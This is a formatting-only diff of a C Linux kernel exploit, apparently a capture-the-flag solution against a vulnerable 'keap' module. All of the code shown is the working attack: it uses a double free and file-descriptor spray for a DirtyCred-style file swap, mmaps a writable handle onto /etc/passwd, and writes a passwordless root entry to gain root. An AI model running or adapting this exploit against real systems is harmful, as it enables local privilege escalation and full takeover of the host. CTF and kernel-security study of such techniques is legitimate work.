@@ -1,5 +1,5 @@
-#include <unistd.h>
 #include "libs/pwn.h"
+#include <unistd.h>
 
 #define FS_CONTEXT_SLAB_SIZE 256
 #define NUM_SPRAY_FDS 0x20
@@ -13,7 +13,7 @@ int main(void) {
 
   int tmp_a;
   int freed_fd = -1;
-  void* keap_ptr;
+  void *keap_ptr;
   char buf[FS_CONTEXT_SLAB_SIZE] = {0};
 
   lstage("Initial setup");
@@ -26,7 +26,8 @@ int main(void) {
   lstage("START");
 
   // create target file
-  tmp_a = SYSCHK(open("/tmp/chovid99", O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR));
+  tmp_a = SYSCHK(
+      open("/tmp/chovid99", O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR));
   SYSCHK(close(tmp_a));
 
   linfo("create and free heap allocation for double free later");
@@ -43,7 +44,7 @@ int main(void) {
 
   linfo("Spray FDs");
   int spray_fds[NUM_SPRAY_FDS];
-  for(int i =0;i<NUM_SPRAY_FDS;i++){
+  for (int i = 0; i < NUM_SPRAY_FDS; i++) {
     spray_fds[i] = open("/tmp/chovid99", O_RDWR); // /tmp/a is a writable file
     if (spray_fds[i] == -1) {
       puts("Failed to open FDs");
@@ -52,10 +53,10 @@ int main(void) {
   }
 
   linfo("Free one of the FDs via double free keap");
-  #ifdef DEBUG
+#ifdef DEBUG
   keap_read(keap_ptr, buf, FS_CONTEXT_SLAB_SIZE);
   print_hex(buf, FS_CONTEXT_SLAB_SIZE);
-  #endif
+#endif
   keap_free(keap_ptr);
   // After: 1 fd but pointed chunk is free
 
@@ -71,7 +72,7 @@ int main(void) {
 
   // The freed fd will have lseek value set to 0x8. Try to find it.
   for (int i = 0; i < NUM_SPRAY_FDS; i++) {
-    if (lseek(spray_fds[i], 0 ,SEEK_CUR) == 8) {
+    if (lseek(spray_fds[i], 0, SEEK_CUR) == 8) {
       freed_fd = spray_fds[i];
       lseek(freed_fd, 0x0, SEEK_SET);
       linfo("Found freed fd: %d\n", freed_fd);
@@ -79,10 +80,10 @@ int main(void) {
     }
   }
 
-  #ifdef DEBUG
+#ifdef DEBUG
   keap_read(keap_ptr, buf, FS_CONTEXT_SLAB_SIZE);
   print_hex(buf, FS_CONTEXT_SLAB_SIZE);
-  #endif
+#endif
 
   if (freed_fd == -1) {
     puts("Failed to find FD");
@@ -91,7 +92,8 @@ int main(void) {
 
   // mmap trick instead of race with write
   lstage("DirtyCred via mmap");
-  char *file_mmap = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, freed_fd, 0);
+  char *file_mmap =
+      mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, freed_fd, 0);
   // After: 3 fd 2 refcount (Because new file)
 
   close(freed_fd);
@@ -104,13 +106,13 @@ int main(void) {
   // Effect: FD in mmap (which is writeable) can be replaced with RDONLY file
 
   for (int i = 0; i < PASSWD_SPRAY_FDS; i++) {
-      open("/etc/passwd", O_RDONLY);
+    open("/etc/passwd", O_RDONLY);
   }
-  // After: 2 fd 1 refcount (but writeable due to mmap)
-  #ifdef DEBUG
+// After: 2 fd 1 refcount (but writeable due to mmap)
+#ifdef DEBUG
   keap_read(keap_ptr, buf, FS_CONTEXT_SLAB_SIZE);
   print_hex(buf, FS_CONTEXT_SLAB_SIZE);
-  #endif
+#endif
 
   strcpy(file_mmap, "root::0:0:root:/root:/bin/sh\n");
   lstage("Finished! Reading Flag");
